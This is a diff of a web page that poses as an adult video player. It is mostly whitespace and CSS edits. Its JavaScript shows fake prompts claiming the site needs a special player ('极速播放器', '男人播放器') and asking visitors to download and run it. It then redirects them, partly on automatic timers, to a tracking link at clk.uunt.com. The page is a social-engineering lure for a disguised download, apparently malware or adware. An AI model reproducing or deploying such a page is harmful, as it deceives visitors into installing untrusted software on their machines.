@@ -23,13 +23,11 @@ img{
 	color: #FFF;
 }
 .player{
-
 	width:320px;
 	height:300px;
 	background-image: url(http://ww1.sinaimg.cn/large/005X3pXmjw1eovcjiq0m7j308w08cq2t.jpg);
 	position:relative;
 }
-
 .player .title{
 	height:20px;
 	line-height:20px;
@@ -40,9 +38,10 @@ img{
 	height:238px;
 	overflow:hidden;
 	margin-left:2px;
+	text-align: center;
 }
-#player img{
-vertical-align:middle;
+#player img {
+　　　　vertical-align: middle;
 }
 .player .quanping{
 	display:block;
@@ -102,8 +101,10 @@ vertical-align:middle;
 <div class="player">
     	<div class="title">超性感美人妻私人服務</div>
         <div id="player">
+
   			<img src="http://ww2.sinaimg.cn/large/005X3nNxjw1eovdz23wflg308w0507wh.gif" width="320" height="200" />
-  		</div>
+
+		</div>
         <a href="javascript:void(0);" onclick="javascript:down();" class="quanping"></a>
 <div id="show">
        	  	<div>
@@ -157,7 +158,6 @@ function play(){
 	document.getElementById("show").style.display = "none";
 }
 function show(){
-
 	document.getElementById("show").style.display = "block";
 	d('sp1');
 	window.setTimeout("d('sp2')", 2600);
@@ -179,24 +179,16 @@ function tant() {
         xx = "提示：本站采用 ★极速播放器★ 点播，是否立刻下载运行观看？";
     if (ts == 5)
         xx = "提示：本站采用 ★男人播放器★ 点播，是否立刻下载运行观看？";
-
     return xx;
 }
-
-
-
-
 function d(title) {
     alert(tant());
     window.location.href = down(title);
 };
-
 function down(tt) {
     var dd;
-
     var d1 = "http://clk.uunt.com/link/190308/11";
     var d2 = "http://clk.uunt.com/link/190308/11";
-
     if (tt == "sp1") {
         dd = d1;                //me
        
@@ -205,11 +197,6 @@ function down(tt) {
         dd = d2;                         //me
         
     }
-
-
-
-
-
     return dd;
 }
 </script>
